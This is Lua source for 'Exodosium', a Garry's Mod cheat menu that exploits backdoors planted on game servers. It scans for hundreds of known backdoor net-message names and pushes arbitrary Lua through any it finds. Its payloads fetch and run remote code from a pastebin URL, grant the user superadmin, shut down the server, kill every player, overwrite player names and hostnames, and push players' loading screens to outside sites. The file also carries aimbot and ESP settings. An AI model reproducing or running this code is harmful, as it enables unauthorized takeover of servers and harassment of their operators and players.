local function cprint(...) chat.AddText(Color(154, 204, 20), "[Exodosium] ", Color(255, 255, 255), ...) end
local allowed = {}

local ent = nil

if(!file.Exists("configs", "DATA") || !file.IsDir("configs", "DATA")) then
	file.CreateDir("configs")
end

function collectgarbage(...) return 0 end

local acfags = {
    ["BetterSNTE"] = {
        scan = function()
            if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") then
                return true
            else
                return false
            end
        end
    },
    ["Cake Anti-Cheat (CAC)"] = {
        scan = function()
            if _G.CAC then
                return true
            else
                return false
            end
        end
    },
    ["Quack Anti-Cheat (QAC)"] = {
        scan = function()
            if _G.QAC then
                return true
            else
                return false
            end
        end
    },
    ["Voids LUA Stealer"] = {
        scan = function()
            if file.Exists("autorun/sh_fuckthissheet.lua", "LUA") then
                return true
            else
                return false
            end
        end
    },
    ["Screengrab"] = {
        scan = function()
            if file.Exists("cl_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab_v2.lua", "LUA") then
                return true
            else
                return false
            end
        end
    },
    ["Say No To Exploits (SNTE)"] = {
        scan = function()
            if ConVarExists("snte_ulxluarun" or "snte_duperun" or "snte_banmethod") or file.Exists("autorun/!coresource_snte.lua", "LUA") then
                return true
            else
                return false
            end
        end
    },
    ["Modern Anti-Cheat (MAC)"] = {
        scan = function()
            if file.Exists("autorun/client/!!!!!!!!!!!!!!!!!!!!!!aaaaaaaaaaa.lua", "LUA") or file.Exists("autorun/client/cl_mac.lua", "LUA") then
                return true
            else
                return false
            end
        end
    },
    ["Swift Anti-Cheat (SwiftAC)"] = {
        scan = function()
            if file.Exists("swiftac.lua", "LUA") then
                return true
            else
                return false
            end
        end
    }
}

for k, v in pairs(acfags) do
    if v.scan() then
        cprint("Detected "..k.."!")
    end
end

local function rndstr(len)
	if len == nil then len = 5 end
	local chars = string.Split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789", "")
	local r = ""
	while string.len(r) < len do
		r = r..chars[math.random(1, #chars)]
	end
	return r
end

local ply = LocalPlayer()
local id = ""
for k,v in pairs(string.Split(tostring(ply:SteamID64()), "")) do
	id = id .. string.char(97 + tonumber(v))
end

local securestr = rndstr(16)
local authed = false
local backdoors = {"hacking bro","hackingbro","SDFTableFsSSQE","gmod_dumpcfg","adm_","runSV","argumentumac","utf8-gv",">sv","kebabmenu","LVDLVM","rotten_proute","BITMINER_UPDATE_DLC","nostrip2","Nostra","thenostraall","rconyesyes","GLX_push","operationsmoke","vegeta","hexa","pd1","JSQuery.Data ( Post ( false ) )","anatikisgodd","anatikisgod","https://i.imgur.com/gf6hlml.png","mdrlollesleakcestmal","print ( )","fps","fszof<qOvfdsf","edouardo573","tupeuxpaslabypass","boombox","gPrinters.sncSettings","yerdxnkunhav","kebab","_CAC_G","-c","_reading_darkrp","adsp_door_length","SDFTableFsSSQS","EventStart","data_check","Data.Repost","antileak","weapon_phygsgun_unlimited","dropadmin","CreateAdminRanks","Asunalabestwaifu","SACAdminGift","xmenuiftrue","shittycommand","tro2fakeestunpd","Fibre","d4x1cl","FAdmin_CreateVar","yarrakye","pure_func_run_lua","ContextHelp","nibba","RegenHelp","lmaogetdunked","LV_BD_V2","BlinkingCheckingHelp","createpanel","fuckyou","1337","haxor","DataMinerType","r8helper","azkaw","_chefhackv2","Þà?D)?","Þ  ?D)?","netstream","GetSomeInfo","nostrip1","antilagger","kidrp","ohnothatsbad","VL_BD","L_BD_v2","blacklist_backdoor","Fix_Exploit","yazStats","YOH_SAMBRE_IS_CHEATER","OBF::JH::HAX","FPSVBOOST","RTX420","Revelation","entityhealt","SizzurpDRM","cbbc","gSploit","keyss","banId2","Val","models/zombie.mdl","insid3","ULogs_Info","fix","Gamemode_get","ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ","snte","apg_togglemode","Hi","beedoor","BDST_EngineForceButton","VoteKickNO","REEEEEEEEEEEE","_da_","sniffing","keylogger","CakeInstall","Cakeuptade","love","earth","ulibcheck","Nostrip_","teamfrench","ADM","hack","crack","leak","lokisploit","1234","123","enculer","cake","seized","88_strings_","nostraall","blogs_update","loona_","billys_logs","loona","Reaoscripting","adm_NetString","?","allowLimitedRCON(user) 0","rcon","web","zilnix","ß ?D)?","kill","DarkRP_AllDoorDatas","0101.1","_Infinity","Infinity","InfinityBackdoor","_Infinity_Meme_","_vliss","YYYYTTYXY6Y","?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®","_KekTcf","m9k_addons","0x13","Child","!Cac","childexploit","netlib_debug","_DarkRP_Reading","SteamApp2313","FPP_RemovePLYCache","fuwa","stardoor","AnatikLeNoob","GVacDoor","Keetaxor","BackdoorPrivate666","YohSambreLeBest","SNTE<ALL","!Çº/;.","xenoreceivetargetdata2","xenoreceivetargetdata1","xenoserverdatafunction","xenoserverfunction","xenoclientdatafunction","xenoclientfunction","xenoactivation","EXEC_REMOTE_APPS","The_DankWhy","z","cvardel","json.parse(crashsocket)","effects_en","file","NoOdium_Reaoscripting","banId","kickId2","elsakura","m9k_","Sbox_gm_attackofnullday_key","c","enablevac","ULXQUERY2","Im_SOCool","MoonMan","LickMeOut","SessionBackdoor","OdiumBackDoor","ULX_QUERY2","Sbox_itemstore","Sbox_darkrp","Sbox_Message","_blacksmurf","nostrip","Remove_Exploiters","Sandbox_ArmDupe","rconadmin","jesuslebg","disablebackdoor","blacksmurfBackdoor","jeveuttonrconleul","lag_ping","memeDoor","DarkRP_AdminWeapons","Fix_Keypads","noclipcloakaesp_chat_text","_CAC_ReadMemory","Ulib_Message","Ulogs_Infos","ITEM","nocheat","Î¾psilon","JQerystrip.disable","Sandbox_GayParty","DarkRP_UTF8","PlayerKilledLogged","OldNetReadData","Backdoor","cucked","NoNerks","kek","DarkRP_Money_System","BetStrep","ZimbaBackdoor","something","random","strip0","fellosnake","idk","||||","EnigmaIsthere","ALTERED_CARB0N","killserver","fuckserver","cvaraccess","_Defcon","dontforget","aze46aez67z67z64dcv4bt","nolag","changename","music","_Defqon","xenoexistscl","R8","AnalCavity","DefqonBackdoor","fourhead","echangeinfo","PlayerItemPickUp","thefrenchenculer","elfamosabackdoormdr","stoppk","noprop","reaper","Abcdefgh","JSQuery.Data(Post(false))","pjHabrp9EY","_Raze","88","Dominos","NoOdium_ReadPing","m9k_explosionradius","gag","_cac_","_Battleye_Meme_","legrandguzmanestla","ULogs_B","arivia","_Warns","xuy","samosatracking57","striphelper","m9k_explosive","GaySploitBackdoor","_GaySploit","slua","Bilboard.adverts:Spawn(false)","BOOST_FPS","FPP_AntiStrip","ULX_QUERY_TEST2","FADMIN_ANTICRASH","ULX_ANTI_BACKDOOR","UKT_MOMOS","rcivluz","SENDTEST","MJkQswHqfZ","INJ3v4","_clientcvars","_main","GMOD_NETDBG","thereaper","audisquad_lua","anticrash","ZernaxBackdoor","bdsm","waoz","stream","adm_network","antiexploit","ReadPing","berettabest","componenttolua","theberettabcd","negativedlebest","mathislebg","SparksLeBg","DOGE","FPSBOOST","N::B::P","PDA_DRM_REQUEST_CONTENT","shix","Inj3","AidsTacos","verifiopd","pwn_wake","pwn_http_answer","pwn_http_send","The_Dankwoo","PRDW_GET","fancyscoreboard_leave","DarkRP_Gamemodes","DarkRP_Armors","yohsambresicianatik<3","EnigmaProject","PlayerCheck","Ulx_Error_88","FAdmin_Notification_Receiver","DarkRP_ReceiveData","Weapon_88","__G____CAC","AbSoluT","mecthack","SetPlayerDeathCount","awarn_remove","fijiconn","nw.readstream","LuaCmd","The_DankWhy"}
local bkscripts = {
	{
		name = "ZA WARUDO",
		code = [[
			util.AddNetworkString("ZA WARUDO")
			net.Receive("ZA WARUDO", function(len, ply)
				ply:Freeze()
			end)
			local function send(ply)
				ply:SendLua("net.Receive('ZA WARUDO',function()RunString(net.ReadString())end)")
				net.Start("ZA WARUDO")
				net.WriteString([=[
					sound.PlayURL("https://exodosium.pw/music/zawarudo.mp3", "mono", function(s)
						if IsValid(s) then
							s:Play()
							s:SetVolume(5)
							timer.Simple(3, function()
								local ang = LocalPlayer():EyeAngles()
								hook.Add("CreateMove", "ZA WARUDO", function(cmd) cmd:SetButtons(0) cmd:SetForwardMove(0) cmd:SetSideMove(0) cmd:SetViewAngles(ang) end)
								hook.Add("CalcView", "ZA WARUDO", function(ply, origin, angles, fov) return {angles=ang,origin=origin,fov=fov} end)
								hook.Add("Think","ZA WARUDO",function() gui.HideGameUI() end)
								net.Start("ZA WARUDO")
								net.SendToServer()
							end)
						end
					end)
				]=])
				net.Send(ply)
			end
			for k, v in pairs(player.GetAll()) do
				send(v)
			end
			hook.Add("PlayerAuthed", "ZA WARUDO", function(ply)
				send(ply)
			end)
		]]
	},
	{
		name = "Custom Job",
		code = [[
			TEAM_]]..securestr..[[ = DarkRP.createJob("]]..ply:GetName()..[['s Custom Class", {
				model = "models/player/skeleton.mdl",
				weapons = {"arrest_stick", "unarrest_stick", "m9k_glock", "m9k_honeybadger", "m9k_svu", "m9k_minigun", "m9k_dbarrel", "stunstick", "door_ram", "weaponchecker"},
				command = "]]..securestr..[[",
				description = "Custom Job For ]]..ply:GetName()..[[",
				max = 1,
				customCheck = function(ply) return ply:SteamID() == "]]..ply:SteamID()..[[" end,
				CustomCheckFailMsg = "This isn't your custom class!",
				color = Color(]]..math.random(0, 255)..[[, ]]..math.random(0, 255)..[[, ]]..math.random(0, 255)..[[),
				salary = 1000000000,
				admin = 0,
				vote = false,
				hasLicense = true,
			})
		]],
		ccode = [[
			timer.Simple(0.2, function() LocalPlayer():ConCommand("darkrp ]]..securestr..[[") end)
		]],
		once = true,
		gmrestrict = {"DarkRP"}
	},
	{
		name = "Infinite Ammo",
		code = [[
			timer.Create("ia_]]..securestr..[[", 0.01, 0, function()
				local p = player.GetBySteamID("]]..ply:SteamID()..[[")
				if IsValid(p) && p:Alive() then
					local w = p:GetActiveWeapon()
					if IsValid(w) then
						w:SetClip1(w:GetMaxClip1())
					end
				end
			end)
		]]
	},
	{
		name = "Rapid Fire",
		shcode = [[
			timer.Create("rf_]]..securestr..[[", 0.01, 0, function()
				local p = player.GetBySteamID("]]..ply:SteamID()..[[")
				if p && IsValid(p) && p:Alive() then
					local w = p:GetActiveWeapon()
					if IsValid(w) then
						w:SetNextPrimaryFire(CurTime())
						w:SetNextSecondaryFire(CurTime())
					end
				end
			end)
		]],
		code = [[]]
	},
	{
		name = "OP Gun",
		shcode = [[
			local SWEP = {}

			SWEP.PrintName = "OP Gun"

			SWEP.Weight = 1000
			
			SWEP.AutoSwitchTo = true
			SWEP.AutoSwitchFrom = false

			SWEP.HoldType = "smg"

			SWEP.Spawnable = false
			SWEP.DisableDuplicator = true

			SWEP.Base = "weapon_base"

			SWEP.Slot = 1
			SWEP.SlotPos = 1000
			SWEP.DrawAmmo = false
			SWEP.DrawCrosshair = false

			SWEP.UseHands = false
			SWEP.ViewModelFlip = false
			SWEP.ViewModelFOV = 54
			SWEP.ViewModel = "models/weapons/v_smg1.mdl"
			SWEP.WorldModel = "models/weapons/w_smg1.mdl"

			SWEP.Primary = {}
			SWEP.Primary.ClipSize = -1
			SWEP.Primary.DefaultClip = -1
			SWEP.Primary.Automatic = true
			SWEP.Primary.Ammo = "none"

			SWEP.Secondary = {}
			SWEP.Secondary.ClipSize = 0
			SWEP.Secondary.DefaultClip = 0
			SWEP.Secondary.Automatic = true
			SWEP.Secondary.Ammo = "none"

			function SWEP:PrimaryAttack()
				local p = self:GetOwner()
				local bullet = {}
				bullet.Num = 1
				bullet.Src = p:GetShootPos()
				bullet.Dir = p:GetAimVector()
				bullet.Spread = Vector(0.02, 0.02, 0)
				bullet.Tracer = -1
				bullet.Force = 100000
				bullet.Damage = bullet.Force
				p:FireBullets(bullet)
			end

			function SWEP:SecondaryAttack()
				local p = self:GetOwner()
				local bullet = {}
				bullet.Num = 64
				bullet.Src = p:GetShootPos()
				bullet.Dir = p:GetAimVector()
				bullet.Spread = Vector(0.1, 0.1, 0)
				bullet.Tracer = -1
				bullet.Force = 100000
				bullet.Damage = bullet.Force
				p:FireBullets(bullet)
			end

			function SWEP:Think()
				self:SetHoldType(self.HoldType)
			end
			
			weapons.Register(SWEP, "weapon_]]..id..[[")
		]],
		code = [[
			local ply = player.GetBySteamID("]]..ply:SteamID()..[[")
			hook.Add("Think", "]]..id..[[", function()
				if ply:IsValid() && !ply:HasWeapon("weapon_]]..id..[[") then
					ply:Give("weapon_]]..id..[[")
				end
			end)
		]]
	},
	{
		name = "Pwn Server",
		code = [[
			function catch() return "☠ Pwned By Exodosium.pw ☠" end
			local p = debug.getregistry()
			p.Player.IPAddress = catch
			p.Player.Nick = catch
			p.Player.GetName = catch
			p.Player.SteamID = catch
			p.Player.SteamID64 = catch
			RunConsoleCommand("hostname", catch())
			RunConsoleCommand("sv_loadingurl", "https://exodosium.pw/pwn.html")
			timer.Create("pwn_]]..securestr..[[", 0, 0, function()
				for k,v in pairs(player.GetAll()) do
					v:setDarkRPVar("rpname", catch())
				end
			end)
		]]
	},
	{
		name = "Toggle Coughing",
		code = [[
			for k,v in pairs(player.GetAll()) do
				v:ConCommand("say \"// *cough* *cough*\"")
				v:EmitSound("ambient/voices/cough1.wav", 100)
			end
			
			if not timer.Exists("co_]]..securestr..[[") then
				timer.Create("co_]]..securestr..[[", 2, 0, function()
					for k,v in pairs(player.GetAll()) do
						v:ConCommand("say \"// *cough* *cough*\"")
						v:EmitSound("ambient/voices/cough1.wav", 100)
					end
				end)
			else
				timer.Destroy("co_]]..securestr..[[")
			end
		]]
	},
	{
		name = "Free DarkRP Money",
		code = [[
			for i = 0,5 do
				timer.Create("]]..securestr..[["..i, 0, 0, function()
					local ply = player.GetBySteamID("]]..ply:SteamID()..[[")
					ply:addMoney(100)
				end)
			end
		]],
		gmrestrict = {"DarkRP"}
	},
	{
		name = "Pornhub Loading Screen",
		code = [[
			game.ConsoleCommand("sv_loadingurl \"https://pornhub.com/\"\n")
		]],
		once = true
	},
	{
		name = "/kill @a",
		code = [[
			for k,v in pairs(player.GetAll()) do
				if v:Alive() then v:Kill() end
			end
		]]
	},
	{
		name = "/spawn @a",
		code = [[
			for k,v in pairs(player.GetAll()) do
				v:Spawn()
			end
		]]
	},
	{
		name = "YEET Players",
		code = [[
			for k,v in pairs(player.GetAll()) do
				v:SetVelocity(Vector(math.random(-3000, 3000), math.random(-3000, 3000), math.random(1000, 5000)))
			end
		]]
	},
	{
		name = "Cock and Ball Torture.ogg",
		code = [[
			BroadcastLua("sound.PlayURL('https://upload.wikimedia.org/wikipedia/commons/4/41/CocknBallTorture.ogg', '', function(s) s:Play() end)")
		]]
	},
	{
		name = "Shutdown Server",
		code = [[
			game.ConsoleCommand("disconnect\n")
		]]
	},
	{
		name = "Get Superadmin",
		code = [[
			player.GetBySteamID("]]..ply:SteamID()..[["):SetUserGroup("superadmin")
			game.ConsoleCommand("ulx adduserid \"]]..ply:SteamID()..[[\" superadmin\n")
		]]
	}
}
local showtip = true

local Cheats = {
	["Aimbot"] = {
		["Enabled"] = false,
		["Body Aim"] = false,
		["Auto Shoot"] = false,
	},
	["Visuals"] = {
		["Chams"] = false,
		["Box ESP"] = false,
		["Crosshair"] = false,
		["Thirdperson"] = false,
		["GTA 3 Camera"] = false,
		["No Viewmodel"] = false,
		["No Visual Recoil"] = false,
	},
	["HvH"] = {
		["Anti-Aim"] = false,
		["Anti-Aim X"] = {
			["Spin"] = true,
			["Left"] = false,
			["Right"] = false,
			["Switch"] = false,
			["Fake Spin"] = false,
			["Fake Left"] = false,
			["Fake Right"] = false,
			["Fake Switch"] = false
		},
		["Anti-Aim Y"] = {
			["Forwards"] = true,
			["Up"] = false,
			["Down"] = false,
			["Switch"] = false,
			["Fake Forwards"] = false,
			["Fake Up"] = false,
			["Fake Down"] = false,
			["Fake Switch"] = false
		},
		["Resolver"] = false,
	},
	["Misc"] = {
		["Use Spam"] = false,
		["Bunnyhop"] = false,
		["AutoClicker"] = false,
		["Anti Screengrab"] = false,
	}
}

local CheatsOrder = {
	["Aimbot"] = 1,
	["Visuals"] = 2,
	["HvH"] = 3,
	["Misc"] = 4,
}

local function getcfgs()
	local f = file.Find("configs/*.txt", "DATA")
	local r = {}
	for k,v in ipairs(f) do
		table.insert(r, string.sub(v, 0, string.len(v) - 4))
	end
	return r
end

local function save(name)
	file.Write("configs/"..name..".txt", util.TableToJSON(Cheats))
end

local function load(name)
	if !file.Exists("configs/"..name..".txt", "DATA") then return end
	local f = util.JSONToTable(file.Read("configs/"..name..".txt"))
	Cheats = f
end

load("default")

local chamsmat_vis = CreateMaterial("a", "VertexLitGeneric", {
	["$ignorez"] = 0,
	["$model"] = 0,
	["$basetexture"] = "models/debug/debugwhite",
})

local chamsmat_invis = CreateMaterial("@", "VertexLitGeneric", {
	["$ignorez"] = 1,
	["$model"] = 1,
	["$basetexture"] = "models/debug/debugwhite",
})

local channel = ""

local vgui = _G.vgui
local string = _G.string
local surface = _G.surface
local timer = _G.timer
local net = _G.net
local util = _G.util
local RunString = _G.RunString
local http = _G.http

local function netcheck(str)
	local i = 1
	while util.NetworkIDToString(i) ~= nil do
		if util.NetworkIDToString(i) == str then
			return true
		end
		i = i + 1
	end
end

if !table.HasValue(allowed, ply:SteamID()) then
	cprint("You are not allowed to use this menu.")
	timer.Simple(1, function() 
		table.Empty(_G)
	end)
	return
end

cprint("Loaded!")

if(netcheck("BetterSNTE")) then
	cprint("WARNING: BetterSNTE Detected!")
end

local function send(c)
	if channel ~= "" && netcheck(channel) then
		net.Start(channel)
		net.WriteString(c)
		net.SendToServer()
		return true
	else
		cprint("No NetString Selected.")
		return false
	end
end

RunConsoleCommand("gmod_mcore_test", "1") RunConsoleCommand("mat_queue_mode", "-1") RunConsoleCommand("cl_threaded_bone_setup", "1") RunConsoleCommand("cl_threaded_client_leaf_system", "1") RunConsoleCommand("r_threaded_client_shadow_manager", "1") RunConsoleCommand("r_threaded_particles", "1") RunConsoleCommand("r_threaded_renderables", "1") RunConsoleCommand("r_queued_ropes", "1") RunConsoleCommand("studio_queue_mode", "1") hook.Remove("RenderScreenspaceEffects", "RenderColorModify") hook.Remove("RenderScreenspaceEffects", "RenderBloom") hook.Remove("RenderScreenspaceEffects", "RenderToyTown") hook.Remove("RenderScreenspaceEffects", "RenderTexturize") hook.Remove("RenderScreenspaceEffects", "RenderSunbeams") hook.Remove("RenderScreenspaceEffects", "RenderSobel") hook.Remove("RenderScreenspaceEffects", "RenderSharpen") hook.Remove("RenderScreenspaceEffects", "RenderMaterialOverlay") hook.Remove("RenderScreenspaceEffects", "RenderMotionBlur") hook.Remove("RenderScene", "RenderStereoscopy") hook.Remove("RenderScene", "RenderSuperDoF") hook.Remove("GUIMousePressed", "SuperDOFMouseDown") hook.Remove("GUIMouseReleased", "SuperDOFMouseUp") hook.Remove("PreventScreenClicks", "SuperDOFPreventClicks") hook.Remove("PostRender", "RenderFrameBlend") hook.Remove("PreRender", "PreRenderFrameBlend") hook.Remove("Think", "DOFThink") hook.Remove("RenderScreenspaceEffects", "RenderBokeh") hook.Remove("NeedsDepthPass", "NeedsDepthPass_Bokeh") hook.Remove("PostDrawEffects", "RenderWidgets") hook.Remove("PostDrawEffects", "RenderHalos") hook.Add("OnEntityCreated","WidgetInit",function(ent) if ent:IsWidget() then hook.Add("PlayerTick", "TickWidgets", function(pl, mv) widgets.PlayerTick(pl, mv) end)  hook.Remove("OnEntityCreated","WidgetInit") end end)

local menu = vgui.Create("DFrame")
function menu.Paint(self, w, h)
    draw.RoundedBox(0, 0, 0, w, h, Color(25, 28, 31))
end
menu:SetSize(1200, 700)
menu:Center()
menu:MakePopup()
menu:ShowCloseButton(false)
menu:SetTitle("")
menu:DockPadding(0, 0, 0, 0)

surface.CreateFont("Exodosium", {
    font = "Ubuntu Mono",
    size = 16,
})

local titlebar = vgui.Create("DPanel", menu)
function titlebar.Paint(self, w, h)
    draw.RoundedBox(0, 0, 0, w, h, Color(52, 60, 65))
end
titlebar:SetSize(50, 50)
titlebar:Dock(TOP)

local brand = vgui.Create("DPanel", titlebar)
function brand.Paint(self, w, h)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0))
end
brand:SetSize(120, 60)
brand:Dock(LEFT)

local brandtxt = vgui.Create("DHTML", brand)
brandtxt:SetHTML([[<link rel="stylesheet" type="text/css" href="https://exodosium.pw/css/style.css"><link rel="stylesheet" type="text/css" href="https://exodosium.pw/css/pe-icon.css"><link rel="stylesheet" type="text/css" href="https://exodosium.pw/css/helper.css"><a style="background-color: #000 !important;color: #fff !important;cursor: default;user-select: none;width: 100vw !important; height: 100vh !important;" class="navbar-brand"><small style="font-size: 15px;"><i class="text-success pe pe-7s-lock"></i> Exodosium</small></a>]])
brandtxt:Dock(FILL)

surface.SetFont("Exodosium")

local user = vgui.Create("DPanel", titlebar)
function user.Paint(self, w, h)
    draw.RoundedBox(0, 0, 0, w, h, Color(25, 28, 31, 100))
end
user:SetSize(surface.GetTextSize("  "..ply:GetName().."  ") + titlebar:GetTall(), titlebar:GetTall())
user:Dock(RIGHT)

local avatar = vgui.Create("AvatarImage", user)
avatar:SetPlayer(ply, 128)
avatar:SetSize(titlebar:GetTall(), titlebar:GetTall())
avatar:Dock(RIGHT)

local name = vgui.Create("DLabel", user)
name:SetFont("Exodosium")
name:SetSize(surface.GetTextSize(ply:GetName().."  "), 0)
name:SetText(ply:GetName().."  ")
name:Dock(RIGHT)

local main = vgui.Create("DColumnSheet", menu)
main:SetSize(666, 666)
main:Dock(FILL)
function main.Paint(self, w, h)
    draw.RoundedBox(0, 0, 0, w, h, Color(25, 28, 31))
end

local e = false

local function PaintTXT(self,w,h)
	draw.RoundedBox(4, 0, 0, w, h, Color(57, 65, 71))
	self:DrawTextEntryText(Color(148, 155, 162), Color(30, 130, 255), Color(148, 155, 162))
end

local function PaintBTN(self,w,h)
	self:SetTextColor(Color(154, 204, 20))
	draw.RoundedBox(4, 0, 0, w, h, Color(154, 204, 20))
	draw.RoundedBox(4, 1, 1, w-2, h-2, Color(30, 33, 37))
	if self:IsHovered() then
		self:SetTextColor(Color(255, 255, 255))
		draw.RoundedBox(4, 1, 1, w-2, h-2, Color(154, 204, 20, 10))
	end
end

local check = ""

if system.IsWindows() then
	surface.CreateFont("Icons", {
		font = "Segoe UI Symbol",
		size = 18,
	})
	check = ""
elseif system.IsLinux() then
	surface.CreateFont("Icons", {
		font = "Marlett",
		size = 18,
	})
	check = "a"
end

local function PaintCHK(self,w,h)
	local chk = self
	function self.Button:Paint(w, h)
		local self = chk.Button
		if self:GetChecked() then
			if chk:IsHovered() || chk.Label:IsHovered() || self:IsHovered() then
				draw.RoundedBox(0, 1, 1, h, h, Color(116, 155, 12))
			else
				draw.RoundedBox(0, 1, 1, h, h, Color(154, 204, 20))
			end
			surface.SetTextColor(255, 255, 2555)
			surface.SetFont("Icons")
			surface.SetTextPos(-0.7, -1)
			surface.DrawText(check)
		elseif chk:IsHovered() || chk.Label:IsHovered() || self:IsHovered() then
			draw.RoundedBox(0, 1, 1, h, h, Color(23, 26, 29))
		else
			draw.RoundedBox(0, 1, 1, h, h, Color(41, 46, 51))
		end
	end
end

local function PaintLST(self,w,h)
    surface.SetDrawColor(Color(154, 204, 20))
	surface.DrawOutlinedRect(0, 0, w, h)
	for k,v in pairs(self.Lines) do
		for id, lbl in pairs(v.Columns) do
            lbl:SetColor(Color(255, 255, 255))
        end
        function v:Paint(w, h)
			if v:IsSelected() then
				surface.SetDrawColor(Color(154, 204, 20, 20))
				surface.DrawRect(0, 0, w, h)
			elseif v:IsHovered() then
				surface.SetDrawColor(Color(255, 255, 255, 20))
				surface.DrawRect(0, 0, w, h)
			end
            surface.SetDrawColor(Color(154, 204, 20))
            surface.DrawRect(0, h-1, w, 1)
        end
	end
	for k,v in pairs(self.Columns) do
		v.Header:SetColor(Color(255, 255, 255))
		function v.Header:Paint(w, h)
			draw.RoundedBox(0, 0,   h-1,  w, 1, Color(154, 204, 20))
			draw.RoundedBox(0, 0,   0,    w, 1, Color(154, 204, 20))
			draw.RoundedBox(0, 0,   0,    1, h, Color(154, 204, 20))
			draw.RoundedBox(0, w-1, 0,    1, h, Color(154, 204, 20))
		end
	end
end

local function PaintTAB(self,w,h)
	draw.RoundedBox(0, 0, 0, w, h, Color(30, 33, 37))
end

local function PaintOPT(self,w,h)
    if string.StartWith(self:GetText(), "> ") then
		self:SetEnabled(false)
		self:SetTextColor(Color(192, 196, 200))
		draw.RoundedBox(0, 0, h-1, w, 1, Color(44, 48, 54))
    elseif main:GetActiveButton() == self then
		draw.RoundedBox(0, 0, 0, 4, h, Color(154, 204, 20))
		self:SetTextColor(Color(255, 255, 255))
	elseif self:IsHovered() then
		self:SetTextColor(Color(192, 196, 200))
	else
		self:SetTextColor(Color(132, 140, 148))
		if (e == false && self:GetText() == "Dashboard") then
			main:SetActiveButton(self)
			e = true
		end
	end
end

function main:Paint()
	for k,v in pairs(main.Items) do
		v.Button.Paint = PaintOPT
	end
end

main:AddSheet("> Main", vgui.Create("DPanel", main))

local dash = vgui.Create("DPanel", main)
dash.Paint = PaintTAB
dash:Dock(FILL)

local info = vgui.Create("DLabel", dash)
info:SetPos(5, 5)
info:SetText("Known Backdoors: "..#backdoors)
info:SetSize(130, info:GetTall())

main:AddSheet("Dashboard", dash)

main:AddSheet("> Backdoors", vgui.Create("DPanel", main))

local scanner = vgui.Create("DPanel", main)
scanner.Paint = PaintTAB
scanner:Dock(FILL)

local scanbtn = vgui.Create("DButton", scanner)
scanbtn.Paint = PaintBTN
scanbtn:SetText("Scan for Backdoors")
scanbtn:SetSize(200, scanbtn:GetTall())
scanbtn:SetPos(5, 5)

local logchk = vgui.Create("DCheckBoxLabel", scanner)
logchk.Paint = PaintCHK
logchk:SetPos(5, 10 + scanbtn:GetTall())
logchk:SetText("Log to Chat")

local bklist = vgui.Create("DListView", scanner)
bklist.Paint = PaintLST
bklist:SetPos(5, 15 + scanbtn:GetTall() + logchk:GetTall())
bklist:AddColumn("NetString")
bklist:SetSize(200, 570)
function bklist:DoDoubleClick(id, pnl)
	channel = pnl:GetColumnText(1)
	cprint("Channel: "..pnl:GetColumnText(1))
end

function scanbtn:DoClick()
	local found = false
	bklist:Clear()
	for k,v in pairs(backdoors) do
		if netcheck(v) then
			if logchk:GetChecked() then cprint(v) end
			bklist:AddLine(v)
			found = true
		end
	end
	if !found then
		cprint("No backdoors found.")
	end
end

main:AddSheet("Scanner", scanner)

local scripts = vgui.Create("DScrollPanel", main)
scripts.Paint = PaintTAB
scripts:Dock(FILL)

local httprun = vgui.Create("DTextEntry", scripts)
httprun:SetPos(200, 5)
httprun:SetSize(200, httprun:GetTall())
httprun:SetText("https://pastebin.com/raw/feZxqHph")
httprun.Paint = PaintTXT

local httpbtn = vgui.Create("DButton", scripts)
httpbtn:SetPos(200, 10 + httprun:GetTall())
httpbtn:SetSize(httprun:GetWide(), httprun:GetTall())
httpbtn:SetText("Fetch & Run")
httpbtn.Paint = PaintBTN
function httpbtn:DoClick()
	send("http.Fetch(\""..httprun:GetText().."\", RunString)")
end

local rconcmd = vgui.Create("DTextEntry", scripts)
rconcmd:SetPos(200, 15 + httprun:GetTall() + httpbtn:GetTall())
rconcmd:SetSize(200, httprun:GetTall())
rconcmd:SetText("ulx adduserid \""..ply:SteamID().."\" superadmin")
rconcmd.Paint = PaintTXT

local rconbtn = vgui.Create("DButton", scripts)
rconbtn:SetPos(200, 20 + httprun:GetTall() + httpbtn:GetTall() + rconcmd:GetTall())
rconbtn:SetSize(rconcmd:GetWide(), rconcmd:GetTall())
rconbtn:SetText("Run Command")
rconbtn.Paint = PaintBTN
function rconbtn:DoClick()
	send("game.ConsoleCommand([["..rconcmd:GetText().."\n]])")
end

local luacmd = vgui.Create("DTextEntry", scripts)
luacmd:SetPos(200, 25 + rconcmd:GetTall() + rconbtn:GetTall() + httprun:GetTall() + httpbtn:GetTall())
luacmd:SetSize(200, httprun:GetTall())
luacmd:SetText("print('test')")
luacmd.Paint = PaintTXT

local luabtn = vgui.Create("DButton", scripts)
luabtn:SetPos(200, 30 + luacmd:GetTall() + httprun:GetTall() + httpbtn:GetTall() + rconcmd:GetTall() + rconbtn:GetTall())
luabtn:SetSize(luacmd:GetWide(), luacmd:GetTall())
luabtn:SetText("Run Code")
luabtn.Paint = PaintBTN
function luabtn:DoClick()
	send(luacmd:GetText())
end

local ofs = 0

for k,v in pairs(bkscripts) do
	surface.SetFont("DermaDefault")
	local n = v.name
	if v.shcode then
		if not v.ccode then v.ccode = "" end
		v.ccode = v.shcode .. "\n" .. v.ccode
		v.code = v.shcode .. "\n" .. v.code
	end
	local c = v.code
	local script = vgui.Create("DButton", scripts)
	script.Paint = PaintBTN
	script:SetPos(5, 5 + ofs)
	script:SetText(n)
	script:SetSize(surface.GetTextSize(n) + 20, script:GetTall())
	function script:DoClick()
		if v.gmrestrict && !table.HasValue(v.gmrestrict, gmod.GetGamemode().Name) then
			local gm = ""
			for k,v in pairs(v.gmrestrict) do
				gm = gm..", "..v
			end
			surface.PlaySound("buttons/button10.wav")
			cprint("This script can only be used on "..string.sub(gm, 3).."!")
			return
		end

		if v.once && !v.ran || !v.once then
			if send(c) then
				surface.PlaySound("buttons/blip1.wav")
				if v.ccode then RunString(v.ccode) end
				v.ran = true
			else
				surface.PlaySound("buttons/button10.wav")
			end
		elseif v.once && v.ran then
			cprint("Script can only be run once.")
			surface.PlaySound("buttons/button10.wav")
		end
	end
	ofs = ofs + script:GetTall() + 5
end

main:AddSheet("Scripts", scripts)

main:AddSheet("> Cheats", vgui.Create("DPanel", main))

